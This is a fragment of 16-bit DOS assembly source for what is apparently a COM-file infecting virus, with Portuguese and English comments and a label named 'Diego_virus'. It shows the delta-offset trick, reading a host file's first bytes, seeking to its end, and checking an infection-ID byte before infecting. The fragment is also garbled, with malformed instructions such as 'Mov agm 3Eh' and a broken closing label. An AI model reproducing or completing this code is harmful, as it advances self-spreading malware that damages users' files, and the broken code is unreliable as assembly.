	JE READ
	JNE Diego_virus

codigo segment 'code'

	org 100h 

	assume cs:codigo,ds:codigo,es:codigo
	
start proc far
START:
	push cs
	push cs
	
	pop ds	
	pop es
	
	call falso_proc

falso_proc 	proc near
falso_proc  endp

	pop bp
	sub bp, 107h
	
	mov ah, 3Fh ;Leia os três primeiros
mov 	cx, 3 ;bytes do arquivo
lea	dx, [bp+offset buffer] ; buffer
int 	21h
mov 	ax, 4202h ;SEEK from EOF
xor 	cx, cx ;DX:CX = offset
xor 	dx, dx ;Retorna o tamanho do arquivo
int 	21h ;in DX:AX
Sub 	ax, virus_size + 3
cmp 	word ptr [bp+offset buffer+1], ax
jnz 	infect_it
bomb_out:
Mov 	agm 3Eh ;senao feche o arquivo
Int 	21 ; e vá procurar outro

mov 	ah, 3Fh 
mov 	cx, 4 
lea 	dx, [bp+offset buffer]
int 	21h
cmp 	byte ptr [buffer+3],infection_id_byte;Check the fourth
jz bomb_out
Infect_it;
